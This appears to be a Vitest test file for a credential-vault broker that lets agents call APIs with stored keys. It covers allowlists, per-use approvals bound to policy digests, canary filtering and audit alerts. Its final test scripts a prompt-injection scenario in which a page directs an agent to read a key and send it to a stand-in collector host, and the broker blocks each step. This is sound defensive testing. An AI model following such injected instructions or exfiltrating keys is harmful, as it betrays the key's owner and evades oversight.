import { randomUUID } from 'node:crypto';
import { Readable } from 'node:stream';
import { describe, expect, it, vi } from 'vitest';
import { policyDigest } from '../../src/actions/api.js';
import { createBrokerCoreHandlers } from '../../src/broker/handlers/index.js';
import { CONNECTORS, createEgressExecutor, enforcedMode, type ConnectorRegistry, type EgressTransport } from '../../src/egress/index.js';
import { buildCanarySet } from '../../src/canary/index.js';
import { EgressRefusal, type ApiRequestSpec, type EgressExecutor } from '../../src/types.js';
import { actorOf, type PolicyInput } from '../../src/core-types.js';
import { RecordingAlertSink, otherCaller, scopeOf, testCaller, type TestBroker } from '../support/kit.js';
import { HOST, apiInput, apiKey, approve, events, harness, invoke, login, policyInput, share } from './fixtures.js';

function fakeNetwork(body = '{"ok":true}', connectors?: ConnectorRegistry) {
  const resolve = vi.fn(async () => [{ address: '93.184.216.34', family: 4 as const }]);
  const transport = vi.fn<EgressTransport>(async () => ({ status: 200, headers: { 'content-type': 'application/json' },
    body: Readable.from([Buffer.from(body)]), close() {} }));
  const executor = createEgressExecutor({ resolve, transport, ...(connectors ? { connectors } : {}) });
  const execute = vi.fn<EgressExecutor['execute']>((input) => executor.execute(input));
  return { execute, transport, resolve };
}

async function setPolicy(broker: TestBroker, itemId: string, policy: PolicyInput) {
  await broker.store.transaction(scopeOf(testCaller), async (tx) => {
    const current = await tx.items.get(itemId);
    await tx.policies.set(itemId, current!.version, policy, actorOf(testCaller));
  });
}

describe('agent API actions', () => {
  it('passes the active policy, canary set and signal and disposes the key on success', async () => {
    const { broker, execute } = harness();
    const item = await apiKey(broker);
    const signal = new AbortController().signal;
    const input = apiInput();
    const { data } = await invoke(broker, 'vault.callApi', { itemId: item.id }, input, { signal });
    expect(data.state).toBe('done');
    const received = execute.mock.calls[0]![0];
    expect(received.signal).toBe(signal);
    expect(received.canaries).toBe(broker.components.canaries);
    expect(received.policy).toMatchObject({ keyId: item.id, hosts: [HOST], version: 1 });
    expect(received.key.disposed).toBe(true);
    const stored = await broker.store.transaction(scopeOf(testCaller), (tx) => tx.operations.get(input.operationId));
    expect(stored!.result).toMatchObject({ state: 'done', response: { headers: {}, body: { kind: 'withheld', reason: 'replayed' } } });
    const again = await invoke(broker, 'vault.callApi', { itemId: item.id }, input);
    expect(again.data).toEqual(stored!.result);
    expect(execute).toHaveBeenCalledTimes(1);
  });

  it.each([
    [{ method: 'GET', url: 'https://elsewhere.example.test/v1/resource' }, 'host_not_allowed'],
    [{ method: 'DELETE', url: `https://${HOST}/v1/resource` }, 'method_not_allowed'],
    [{ method: 'GET', url: `https://${HOST}/v10/resource` }, 'path_not_allowed'],
    [{ method: 'GET', url: `https://${HOST}/v1/tokens` }, 'token_management_denied'],
  ] as const)('delegates policy validation to the real executor: %s', async (request, code) => {
    const network = fakeNetwork();
    const { broker } = harness({ components: { egress: network } });
    const item = await apiKey(broker);
    const { data } = await invoke(broker, 'vault.callApi', { itemId: item.id }, apiInput({ request }));
    expect(data).toMatchObject({ state: 'refused', code });
    expect(network.execute).toHaveBeenCalledTimes(1);
    expect(network.transport).not.toHaveBeenCalled();
    expect((broker.components.alerts as RecordingAlertSink).kinds()).toContain('egress_refused');
    expect((await events(broker)).at(-1)).toMatchObject({ action: 'api.refused', params: { code } });
    expect(network.execute.mock.calls[0]![0].key.disposed).toBe(true);
  });

  it('refuses missing policies and wrong item types without executing', async () => {
    const { broker, execute } = harness();
    const key = await apiKey(broker, null);
    const loginItem = await login(broker);
    expect((await invoke(broker, 'vault.callApi', { itemId: key.id }, apiInput())).data).toMatchObject({ state: 'refused', code: 'policy_missing' });
    await expect(invoke(broker, 'vault.callApi', { itemId: loginItem.id }, apiInput())).rejects.toMatchObject({ reason: 'wrong_item_type' });
    expect(execute).not.toHaveBeenCalled();
  });

  it('refuses an empty pre-review allowlist intersection before reservation', async () => {
    const { broker, execute } = harness({ config: { mode: 'pre_review' } });
    const item = await apiKey(broker);
    const input = apiInput();
    await expect(invoke(broker, 'vault.callApi', { itemId: item.id }, input)).rejects.toMatchObject({ reason: 'pre_review_limit' });
    expect(execute).not.toHaveBeenCalled();
    expect(await broker.store.transaction(scopeOf(testCaller), (tx) => tx.operations.get(input.operationId))).toBeNull();
  });

  it('a connector template cannot restore a host removed by the pre-review allowlist', async () => {
    const otherHost = 'other-api.example.test';
    const connectors: ConnectorRegistry = { test_connector: { id: 'test_connector', hosts: [HOST, otherHost],
      injection: { kind: 'bearer' }, defaultPathPrefixes: ['/v1'], deny: [] } };
    const network = fakeNetwork(undefined, connectors);
    const { broker } = harness({ config: { mode: 'pre_review', preReview: {
      maxItemsPerMember: 20, allowedFillOrigins: [], allowedApiHosts: [HOST] } }, components: { egress: network } });
    const item = await apiKey(broker, { ...policyInput, mode: 'connector', connector: 'test_connector', hosts: [HOST, otherHost] });
    const { data } = await invoke(broker, 'vault.callApi', { itemId: item.id }, apiInput({ request: { method: 'GET', url: `https://${otherHost}/v1/resource` } }));
    expect(data).toMatchObject({ state: 'refused', code: 'host_not_allowed' });
    expect(network.execute.mock.calls[0]![0].policy.hosts).toEqual([HOST]);
    expect(network.resolve).not.toHaveBeenCalled();
    expect(network.transport).not.toHaveBeenCalled();
  });

  it('intersects a grant and pre-review hosts before reserving when together they leave no destination', async () => {
    const otherHost = 'other-api.example.test';
    const { broker, execute } = harness({ config: { mode: 'pre_review', preReview: {
      maxItemsPerMember: 20, allowedFillOrigins: [], allowedApiHosts: [HOST] } } });
    const item = await apiKey(broker, { ...policyInput, hosts: [HOST, otherHost] });
    await share(broker, item.id, otherCaller, { hosts: [otherHost], origins: null, requireApprovalPerUse: false });
    const input = apiInput({ request: { method: 'GET', url: `https://${otherHost}/v1/resource` } });
    await expect(invoke(broker, 'vault.callApi', { itemId: item.id }, input, { caller: otherCaller }))
      .rejects.toMatchObject({ reason: 'pre_review_limit' });
    expect(execute).not.toHaveBeenCalled();
    expect(await broker.store.transaction(scopeOf(otherCaller), (tx) => tx.operations.get(input.operationId))).toBeNull();
  });

  it('binds per-use API approval to verbatim hostname, pathname, method and exact request hash', async () => {
    const { broker, execute } = harness();
    const item = await apiKey(broker);
    await share(broker, item.id, otherCaller, { hosts: [HOST], origins: null, requireApprovalPerUse: true });
    const request: ApiRequestSpec = { method: 'POST', url: `https://${HOST}/v1/a%20b?view=test-only`, body: { kind: 'json', value: { count: 1 } } };
    const input = apiInput({ request });
    const { data } = await invoke(broker, 'vault.callApi', { itemId: item.id }, input, { caller: otherCaller });
    if (data.state !== 'approval_required') throw new Error('expected approval');
    const { data: approved } = await approve(broker, data.approvalId);
    expect(approved.boundParams).toMatchObject({ kind: 'use', host: HOST, method: 'POST', path: '/v1/a%20b',
      expiresAt: approved.expiresAt, requesterMemberId: otherCaller.memberId });
    expect(approved.boundParams.actionIntentHash).toMatch(/^[a-f0-9]{64}$/);
    const changed = await invoke(broker, 'vault.callApi', { itemId: item.id }, apiInput({ request: {
      ...request, body: { kind: 'json', value: { count: 2 } } } }), { caller: otherCaller });
    expect(changed.data.state).toBe('approval_required');
    expect((await invoke(broker, 'vault.callApi', { itemId: item.id }, { ...input, operationId: randomUUID() }, { caller: otherCaller })).data.state).toBe('done');
    expect(execute).toHaveBeenCalledTimes(1);
  });

  // Brief addendum 5: the owner sees the mode a key runs in before approving, and an approval given
  // under a vetted connector never authorizes the same request once the key runs in generic mode.
  it('binds the enforced API mode, so a connector-mode approval does not carry over to generic mode', async () => {
    const { broker, execute } = harness();
    const github = CONNECTORS.github!;
    const vetted: PolicyInput = { ...policyInput, mode: 'connector', connector: 'github', hosts: [...github.hosts],
      pathPrefixes: ['/user'], injection: github.injection };
    const item = await apiKey(broker, vetted);
    await share(broker, item.id, otherCaller, { hosts: null, origins: null, requireApprovalPerUse: true });
    const request: ApiRequestSpec = { method: 'GET', url: 'https://api.github.com/user' };
    const first = await invoke(broker, 'vault.callApi', { itemId: item.id }, apiInput({ request }), { caller: otherCaller });
    if (first.data.state !== 'approval_required') throw new Error('expected approval');
    const { data: underConnector } = await approve(broker, first.data.approvalId);
    expect(underConnector.boundParams).toMatchObject({ policyMode: 'connector', keyInjection: 'bearer', host: 'api.github.com', path: '/user' });
    await setPolicy(broker, item.id, { ...vetted, mode: 'generic', connector: null });
    const second = await invoke(broker, 'vault.callApi', { itemId: item.id }, apiInput({ request }), { caller: otherCaller });
    if (second.data.state !== 'approval_required') throw new Error('expected a new approval');
    expect(second.data.approvalId).not.toBe(first.data.approvalId);
    expect(execute).not.toHaveBeenCalled();
    const { data: underGeneric } = await invoke(broker, 'vault.approvals.get', { approvalId: second.data.approvalId }, {});
    expect(underGeneric.boundParams).toMatchObject({ policyMode: 'generic', keyInjection: 'bearer', host: 'api.github.com', path: '/user' });
    expect(underGeneric.intentHash).not.toBe(underConnector.intentHash);
    await approve(broker, second.data.approvalId);
    expect((await invoke(broker, 'vault.callApi', { itemId: item.id }, apiInput({ request }), { caller: otherCaller })).data.state).toBe('done');
    expect(execute).toHaveBeenCalledTimes(1);
    expect(execute.mock.calls[0]![0].policy).toMatchObject({ mode: 'generic', connector: null });
    const { data: unused } = await invoke(broker, 'vault.approvals.get', { approvalId: first.data.approvalId }, {});
    expect(unused).toMatchObject({ state: 'approved', consumedAt: null });
  });

  // Builder-side review F02-1: an approval given under one connector policy never authorizes the same request
  // after the policy changes, even when the host, method, path, mode and injection all stay the same.
  it('builder-side review F02-1: binds the connector and the policy by version and digest, so no approval outlives a policy change', async () => {
    const { broker, execute } = harness();
    const github = CONNECTORS.github!;
    const vetted: PolicyInput = { ...policyInput, mode: 'connector', connector: 'github', hosts: [...github.hosts],
      pathPrefixes: ['/user'], injection: github.injection };
    const item = await apiKey(broker, vetted);
    await share(broker, item.id, otherCaller, { hosts: null, origins: null, requireApprovalPerUse: true });
    const request: ApiRequestSpec = { method: 'GET', url: 'https://api.github.com/user' };
    const ask = async () => (await invoke(broker, 'vault.callApi', { itemId: item.id }, apiInput({ request }), { caller: otherCaller })).data;
    const first = await ask();
    if (first.state !== 'approval_required') throw new Error('expected approval');
    const { data: underV1 } = await approve(broker, first.approvalId);
    // Looser rules for the same host, method and path: more prefixes and a larger body.
    const looser: PolicyInput = { ...vetted, pathPrefixes: ['/user', '/repos'], maxRequestBytes: vetted.maxRequestBytes * 2 };
    await setPolicy(broker, item.id, looser);
    const second = await ask();
    if (second.state !== 'approval_required') throw new Error('expected a new approval under the looser policy');
    expect(second.approvalId).not.toBe(first.approvalId);
    // Saved back exactly as it was: the digest matches the first approval's again, the version does not.
    await setPolicy(broker, item.id, vetted);
    const third = await ask();
    if (third.state !== 'approval_required') throw new Error('expected a new approval under the policy saved again');
    expect(new Set([first.approvalId, second.approvalId, third.approvalId]).size).toBe(3);
    expect(execute).not.toHaveBeenCalled();
    // What each approval is bound to, as the owner sees it.
    expect(underV1.boundParams).toMatchObject({ policyMode: 'connector', keyInjection: 'bearer', host: 'api.github.com', path: '/user',
      connector: 'github', policyVersion: 1, policyDigest: policyDigest(vetted) });
    expect(underV1.boundParams.policyDigest).toMatch(/^[a-f0-9]{64}$/);
    const { data: underV2 } = await invoke(broker, 'vault.approvals.get', { approvalId: second.approvalId }, {});
    expect(underV2.boundParams).toMatchObject({ policyMode: 'connector', connector: 'github', policyVersion: 2, policyDigest: policyDigest(looser) });
    expect(underV2.boundParams.policyDigest).not.toBe(underV1.boundParams.policyDigest);
    expect(underV2.intentHash).not.toBe(underV1.intentHash);
    const { data: underV3 } = await invoke(broker, 'vault.approvals.get', { approvalId: third.approvalId }, {});
    expect(underV3.boundParams).toMatchObject({ policyVersion: 3, policyDigest: underV1.boundParams.policyDigest });
    await approve(broker, third.approvalId);
    expect((await ask()).state).toBe('done');
    expect(execute).toHaveBeenCalledTimes(1);
    expect(execute.mock.calls[0]![0].policy).toMatchObject({ version: 3, connector: 'github', pathPrefixes: ['/user'] });
    const { data: unused } = await invoke(broker, 'vault.approvals.get', { approvalId: first.approvalId }, {});
    expect(unused).toMatchObject({ state: 'approved', consumedAt: null });
  });

  it('builder-side review F02-1: the policy digest covers every rule a policy sets, and nothing else', () => {
    const base = { mode: 'connector', connector: 'github', hosts: ['api.github.com'], methods: ['GET'], pathPrefixes: ['/user'],
      maxRequestBytes: 4096, maxResponseBytes: 4096, injection: { kind: 'header', name: 'x-test-key', prefix: 'Key' } } as const;
    const digest = policyDigest(base);
    expect(digest).toMatch(/^[a-f0-9]{64}$/);
    // Key order, copies, and a record's other fields leave it unchanged.
    const reordered = { injection: { prefix: 'Key', name: 'x-test-key', kind: 'header' }, maxResponseBytes: 4096, maxRequestBytes: 4096,
      pathPrefixes: ['/user'], methods: ['GET'], hosts: ['api.github.com'], connector: 'github', mode: 'connector' } as const;
    expect(policyDigest(reordered)).toBe(digest);
    expect(policyDigest({ ...base, version: 9, itemId: 'test-only', createdAt: '2026-01-01T00:00:00.000Z' } as typeof base)).toBe(digest);
    // An absent optional field and one stored as undefined are the same policy.
    const bearer = { ...base, injection: { kind: 'bearer' } } as const;
    expect(policyDigest({ ...base, injection: { kind: 'bearer', prefix: undefined } as unknown as typeof bearer.injection })).toBe(policyDigest(bearer));
    // Every rule changes it.
    const changed = [
      { ...base, mode: 'generic' }, { ...base, connector: null }, { ...base, connector: 'openai' },
      { ...base, hosts: ['api.github.com', 'uploads.github.com'] }, { ...base, methods: ['GET', 'POST'] },
      { ...base, pathPrefixes: ['/user', '/repos'] }, { ...base, pathPrefixes: ['/'] },
      { ...base, maxRequestBytes: 4097 }, { ...base, maxResponseBytes: 4097 },
      { ...base, injection: { ...base.injection, prefix: 'Bearer' } }, { ...base, injection: { ...base.injection, name: 'x-other-key' } },
      bearer, { ...base, injection: { kind: 'query', name: 'x-test-key' } },
    ] as const;
    const digests = changed.map((policy) => policyDigest(policy as Parameters<typeof policyDigest>[0]));
    expect(new Set([digest, ...digests]).size).toBe(changed.length + 1);
  });

  it.each([
    ['a stored connector policy whose template is not vetted', { ...policyInput, mode: 'connector', connector: 'retired_connector' }, 'bearer'],
    ['a generic policy that sends the key in the URL', { ...policyInput, injection: { kind: 'query', name: 'api_key' } }, 'query'],
  ] as const)('binds generic mode for %s', async (_name, policy, keyInjection) => {
    const { broker, execute } = harness();
    const item = await apiKey(broker, policy);
    await share(broker, item.id, otherCaller, { hosts: null, origins: null, requireApprovalPerUse: true });
    const { data } = await invoke(broker, 'vault.callApi', { itemId: item.id }, apiInput(), { caller: otherCaller });
    if (data.state !== 'approval_required') throw new Error('expected approval');
    const { data: view } = await invoke(broker, 'vault.approvals.get', { approvalId: data.approvalId }, {});
    expect(view.boundParams).toMatchObject({ policyMode: 'generic', keyInjection });
    expect(execute).not.toHaveBeenCalled();
  });

  it('labels a connector policy generic unless its template lists vetted operations', () => {
    const unrestricted: ConnectorRegistry = { test_connector: { id: 'test_connector', hosts: [HOST],
      injection: { kind: 'bearer' }, defaultPathPrefixes: ['/v1'], deny: [] } };
    for (const id of Object.keys(CONNECTORS)) expect(enforcedMode({ mode: 'connector', connector: id })).toBe('connector');
    expect(enforcedMode({ mode: 'generic', connector: null })).toBe('generic');
    expect(enforcedMode({ mode: 'connector', connector: 'test_connector' }, unrestricted)).toBe('generic');
    expect(enforcedMode({ mode: 'connector', connector: 'test_connector' },
      { test_connector: { ...unrestricted.test_connector!, operations: [] } })).toBe('generic');
    for (const id of ['retired_connector', 'constructor', 'hasOwnProperty', null]) {
      expect(enforcedMode({ mode: 'connector', connector: id })).toBe('generic');
    }
  });

  it('keeps egress refusal params fixed and disposes the key after an executor error', async () => {
    const { broker, execute } = harness();
    const item = await apiKey(broker);
    execute.mockRejectedValueOnce(new EgressRefusal('private_address'));
    const input = apiInput({ request: { method: 'GET', url: `https://${HOST}/v1/resource?private=test-only` } });
    expect((await invoke(broker, 'vault.callApi', { itemId: item.id }, input)).data).toMatchObject({ state: 'refused', code: 'private_address' });
    expect(execute.mock.calls[0]![0].key.disposed).toBe(true);
    const recorded = await events(broker);
    expect(recorded.at(-1)!.params).toEqual({ operationId: input.operationId, code: 'private_address' });
    expect(JSON.stringify(recorded)).not.toContain('?private');
    expect(JSON.stringify((broker.components.alerts as RecordingAlertSink).alerts)).not.toContain('?private');
  });

  it('wires the real response canary filter and raises the matching alert without returning the value', async () => {
    const planted = ['test', 'only', 'canary'].join('-');
    const network = fakeNetwork(JSON.stringify({ reflected: planted }));
    const canaries = buildCanarySet([planted]);
    const { broker } = harness({ components: { egress: network, canaries } });
    const item = await apiKey(broker);
    const response = await invoke(broker, 'vault.callApi', { itemId: item.id }, apiInput());
    expect(response.data).toMatchObject({ state: 'done', response: { body: { kind: 'withheld', reason: 'canary' } } });
    expect(JSON.stringify(response)).not.toContain(planted);
    expect(network.execute.mock.calls[0]![0].canaries).toBe(canaries);
    expect((await events(broker)).at(-1)).toMatchObject({ action: 'canary.detected', params: { source: 'egress_response' } });
    expect((broker.components.alerts as RecordingAlertSink).kinds()).toContain('canary_detected');
  });
});

describe('acceptance 8: prompt-injection simulation', () => {
  it("an agent a page told to exfiltrate the key gets it from no route, is refused off the allowlist, and the item's owner is alerted", async () => {
    const key = ['test-only', 'api-material'].join('-');
    const encodings = [key, Buffer.from(key).toString('base64'), Buffer.from(key).toString('hex')];
    // The allowed upstream is hostile too: it reflects the key it receives, raw and base64.
    const network = fakeNetwork(JSON.stringify({ reflected: key, encoded: Buffer.from(key).toString('base64') }));
    const respond = network.transport.getMockImplementation()!;
    let upstreamHadKey = false;
    network.transport.mockImplementation(async (input) => {
      upstreamHadKey = Object.values(input.headers).some((value) => value.includes(key));
      return respond(input);
    });
    const { broker } = harness({ components: { egress: network } });
    const item = await apiKey(broker);
    await share(broker, item.id, otherCaller);
    // The grantee's agent follows the page's instructions.
    const agent = { ...otherCaller, kind: 'agent' as const, sessionId: randomUUID() };
    const core = createBrokerCoreHandlers();
    const answers: unknown[] = [];

    // "Read the key out of the vault."
    answers.push(await core['vault.items.get'](await broker.context('vault.items.get', { caller: agent }), { params: { itemId: item.id }, input: {} }));
    answers.push(await core['vault.items.list'](await broker.context('vault.items.list', { caller: agent }), { params: {}, input: {} }));

    // "Send it to the page's collector." The executor refuses before any connection.
    const exfiltration = await invoke(broker, 'vault.callApi', { itemId: item.id },
      apiInput({ request: { method: 'GET', url: 'https://collector.example.invalid/v1/collect?from=page' } }), { caller: agent });
    answers.push(exfiltration);
    expect(exfiltration.data).toMatchObject({ state: 'refused', code: 'host_not_allowed' });
    expect(network.transport).not.toHaveBeenCalled();

    // "Call the allowed host and read the key back from its reply." The key goes upstream only, and the
    // request is cleared of it once sent.
    const reflected = await invoke(broker, 'vault.callApi', { itemId: item.id }, apiInput(), { caller: agent });
    answers.push(reflected);
    expect(reflected.data.state).toBe('done');
    expect(network.transport).toHaveBeenCalledTimes(1);
    expect(upstreamHadKey).toBe(true);
    expect(Object.values(network.transport.mock.calls[0]![0].headers).some((value) => value.includes(key))).toBe(false);
    expect(JSON.stringify(reflected.data).includes('[redacted]')).toBe(true);

    // The item's owner is alerted, not the grantee whose agent made the call, and the event is in the owner's audit view.
    const alerts = (broker.components.alerts as RecordingAlertSink).alerts;
    expect(alerts.filter((alert) => alert.kind === 'egress_refused').map((alert) => [alert.memberId, alert.itemId]))
      .toEqual([[testCaller.memberId, item.id]]);
    const audited = await events(broker);
    expect(audited.filter((event) => event.action === 'api.refused')).toEqual([expect.objectContaining({
      params: expect.objectContaining({ code: 'host_not_allowed' }), subjectMemberId: testCaller.memberId,
      actor: expect.objectContaining({ kind: 'agent', memberId: otherCaller.memberId, sessionId: agent.sessionId }) })]);

    // No route produced the key in any encoding: no answer, alert or audit event carries it.
    const surfaces = JSON.stringify([answers, alerts, audited]);
    // Booleans only, so a failure names the encoding by position without printing it.
    expect(encodings.map((encoded) => surfaces.includes(encoded))).toEqual([false, false, false]);
  });
});
